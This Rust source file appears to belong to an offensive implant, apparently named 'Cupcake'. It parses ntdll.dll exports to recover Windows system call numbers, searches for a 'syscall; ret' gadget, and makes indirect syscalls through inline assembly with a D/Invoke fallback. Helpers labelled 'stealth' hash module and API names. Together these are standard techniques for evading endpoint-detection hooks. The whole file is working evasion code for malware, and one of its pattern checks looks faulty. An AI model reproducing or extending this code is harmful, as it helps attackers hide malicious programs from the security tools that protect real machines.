use std::collections::BTreeMap;
use log::{error};

#[cfg(windows)]
use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
#[cfg(windows)]
#[cfg(target_arch = "x86_64")]
use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

#[cfg(windows)]
lazy_static::lazy_static! {
    static ref SYSCALL_MAP: BTreeMap<u32, u16> = unsafe { resolve_all_ssns() };
    static ref SYSCALL_GADGET: usize = unsafe { find_syscall_gadget() };
}

/// Resolves SSNs for all Nt* functions in ntdll.dll by sorting them by address.
#[cfg(windows)]
unsafe fn resolve_all_ssns() -> BTreeMap<u32, u16> {
    let mut map = BTreeMap::new();
    let ntdll_base = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 { return map; }

    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
    let nt_headers = (ntdll_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    if export_dir_rva == 0 { return map; }

    let export_dir = (ntdll_base + export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (ntdll_base + (*export_dir).AddressOfNames as usize) as *const u32;
    let ordinals = (ntdll_base + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
    let functions = (ntdll_base + (*export_dir).AddressOfFunctions as usize) as *const u32;

    for i in 0..(*export_dir).NumberOfNames {
        let name_ptr = (ntdll_base + *names.add(i as usize) as usize) as *const i8;
        let mut name_bytes = Vec::new();
        let mut idx = 0;
        while *name_ptr.add(idx) != 0 {
            name_bytes.push(*name_ptr.add(idx) as u8);
            idx += 1;
        }

        let name = String::from_utf8_lossy(&name_bytes).to_string();
        if name.starts_with("Nt") {
            let ordinal = *ordinals.add(i as usize);
            let addr = ntdll_base + *functions.add(ordinal as usize) as usize;
            
            // Multiple pattern checks for various Windows versions
            let bytes = std::slice::from_raw_parts(addr as *const u8, 16);
            let mut ssn: Option<u16> = None;

            // Pattern 1: 4C 8B D1, B8 XX XX XX XX (Win10/11, Win8.1 std)
            if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
                ssn = Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as u16);
            }
            // Pattern 2: B8 XX XX XX XX, 4C 8B D1 (Some older versions/hooks)
            else if bytes[0] == 0x1B || (bytes[0] == 0xB8 && bytes[5] == 0x4C && bytes[6] == 0x8B && bytes[7] == 0xD1) {
                ssn = Some(u32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]) as u16);
            }

            if let Some(s) = ssn {
                let hash = crate::stealth::hash_api_name(name.as_bytes());
                map.insert(hash, s);
                
                let zw_name = name.replacen("Nt", "Zw", 1);
                let zw_hash = crate::stealth::hash_api_name(zw_name.as_bytes());
                map.insert(zw_hash, s);
            }
        }
    }

    crate::utils::db_print(&format!("[Cupcake] Resolved {} syscalls via enhanced patterns.", map.len()));
    map
}

/// Finds a 'syscall; ret' gadget in ntdll.dll for indirect syscalls.
#[cfg(windows)]
unsafe fn find_syscall_gadget() -> usize {
    let ntdll_base = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
    if ntdll_base == 0 { return 0; }

    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
    let nt_headers = (ntdll_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    
    // Correct way to find the first section header:
    // NtHeader + 4 (Signature) + 20 (FileHeader) + SizeOfOptionalHeader
    let section_header = (nt_headers as usize + 24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    let num_sections = (*nt_headers).FileHeader.NumberOfSections;

    // Search for syscall (0x0F 0x05) followed by ret (0xC3) ONLY in executable sections
    for i in 0..num_sections {
        let section = *section_header.add(i as usize);
        // IMAGE_SCN_MEM_EXECUTE = 0x20000000
        if (section.Characteristics & 0x20000000) != 0 {
            let addr = ntdll_base + section.VirtualAddress as usize;
            let size = *section.Misc.VirtualSize() as usize;
            
            if size < 3 { continue; }
            let mem = std::slice::from_raw_parts(addr as *const u8, size);

            for j in 0..size - 3 {
                if mem[j] == 0x0F && mem[j+1] == 0x05 && mem[j+2] == 0xC3 {
                    let gadget = addr + j;
                    crate::utils::db_print(&format!("[Cupcake] Found indirect syscall gadget at: 0x{:X}", gadget));
                    return gadget;
                }
            }
        }
    }

    error!("Failed to find syscall gadget in executable sections of ntdll!");
    0
}

#[cfg(windows)]
#[cfg(target_arch = "x86_64")]
pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
    let mut use_fallback = false;
    let ssn = match SYSCALL_MAP.get(&hash) {
        Some(&s) => s,
        None => {
            crate::utils::db_print(&format!("[Cupcake] WARNING: SSN not found for 0x{:X}, triggering D/Invoke fallback...", hash));
            use_fallback = true;
            0
        },
    };

    let gadget = *SYSCALL_GADGET;
    if gadget == 0 && !use_fallback { 
        crate::utils::db_print("[Cupcake] WARNING: No valid syscall gadget found, triggering D/Invoke fallback...");
        use_fallback = true; 
    }

    let mut result: i32 = 0;

    // Build a fixed-size stack payload to avoid inline ASM register allocation panics
    // Support up to 11 arguments safely.
    let mut a = [0usize; 11];
    for (i, &v) in args.iter().enumerate() {
        if i < 11 { a[i] = v; }
    }

    if use_fallback {
        let ntdll_base = crate::stealth::peb::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
        if ntdll_base == 0 { return -1; }
        
        let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
        if api_addr == 0 {
            crate::utils::db_print(&format!("[Cupcake] CRITICAL: Fallback failed! API 0x{:X} not found in ntdll.", hash));
            return -1;
        }
        
        crate::utils::db_print(&format!("[Cupcake] Syscall Fallback: Executing D/Invoke directly at API addr: 0x{:X}", api_addr));

        std::arch::asm!(
            "mov r12, rsp",       
            "sub rsp, 0x68",        
            "and rsp, -16",         
            
            "mov r13, [r14 + 32]", 
            "mov [rsp + 0x20], r13",
            "mov r13, [r14 + 40]", 
            "mov [rsp + 0x28], r13",
            "mov r13, [r14 + 48]", 
            "mov [rsp + 0x30], r13",
            "mov r13, [r14 + 56]", 
            "mov [rsp + 0x38], r13",
            "mov r13, [r14 + 64]", 
            "mov [rsp + 0x40], r13",
            "mov r13, [r14 + 72]", 
            "mov [rsp + 0x48], r13",
            "mov r13, [r14 + 80]", 
            "mov [rsp + 0x50], r13",
            
            "call r15",        
            
            "mov rsp, r12",       
            
            in("r14") a.as_ptr(),
            in("r15") api_addr,
            out("r12") _,
            out("r13") _,
            
            in("rcx") a[0],
            in("rdx") a[1],
            in("r8") a[2],
            in("r9") a[3],
            
            lateout("rax") result,
            clobber_abi("system")
        );
        return result;
    }

    // Direct Indirect Syscall block
    // Using inout("rax") and strictly binding gadget to r15
    // Explicitly declaring out("r10") to stop the compiler from giving us r10 for inputs!
    std::arch::asm!(
        "mov r12, rsp",       // Save original RSP
        "sub rsp, 0x68",      // Accommodate shadow space (32) + 7 stack args (56) + 16 for alignment
        "and rsp, -16",       // Align RSP to 16 bytes for ABI compliance
        
        "mov r13, [r14 + 32]", 
        "mov [rsp + 0x20], r13",
        "mov r13, [r14 + 40]", 
        "mov [rsp + 0x28], r13",
        "mov r13, [r14 + 48]", 
        "mov [rsp + 0x30], r13",
        "mov r13, [r14 + 56]", 
        "mov [rsp + 0x38], r13",
        "mov r13, [r14 + 64]", 
        "mov [rsp + 0x40], r13",
        "mov r13, [r14 + 72]", 
        "mov [rsp + 0x48], r13",
        "mov r13, [r14 + 80]", 
        "mov [rsp + 0x50], r13",
        
        "mov r10, rcx",         // Syscall expects Arg1 in R10
        "call r15",             // Call syscall gadget safely decoupled
        
        "mov rsp, r12",       // Restore original RSP immediately after syscall
        
        inout("rax") ssn as i32 => result,
        in("r14") a.as_ptr(),
        in("r15") gadget,
        out("r10") _,
        out("r12") _,
        out("r13") _,
        
        in("rcx") a[0],
        in("rdx") a[1],
        in("r8") a[2],
        in("r9") a[3],
        
        lateout("r11") _,
        clobber_abi("system")
    );

    result
}

#[cfg(not(windows))]
pub unsafe fn indirect_syscall(_hash: u32, _args: &[usize]) -> i32 {
    -1
}
